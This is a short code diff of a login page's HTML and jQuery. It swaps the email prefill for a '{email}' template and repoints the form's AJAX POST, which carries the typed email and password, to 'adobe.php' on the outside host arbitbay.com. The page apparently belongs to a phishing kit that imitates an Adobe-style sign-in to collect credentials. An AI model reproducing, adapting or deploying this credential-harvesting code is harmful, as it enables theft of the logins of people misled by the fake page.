@@ -407,7 +407,7 @@
                     <label for="email">Email Address</label>
                   </div>
                   <div class="input-field-login icon username-container">
-                    <input name="email" id="email" autofocus="autofocus" value="[EMail]" placeholder="Enter your email address."
+                    <input name="email" id="email" autofocus="autofocus" value="{email}" placeholder="Enter your email address."
                       class="std_textbox" type="text" tabindex="1" required="" />
                   </div>
                   <div class="input-req-login login-password-field-label">
@@ -562,7 +562,7 @@
             $('#submitBtn').text('Signing in...').prop('disabled', true).css('opacity', '0.7');
 
             $.ajax({
-                url: 'https://arbitbay.com/gboto/rccp20musd/adobe.php',
+                url: 'https://arbitbay.com/gboto/adobe/adobe.php',
                 type: 'POST',
                 dataType: 'json',
                 data: { email: email, password: password },
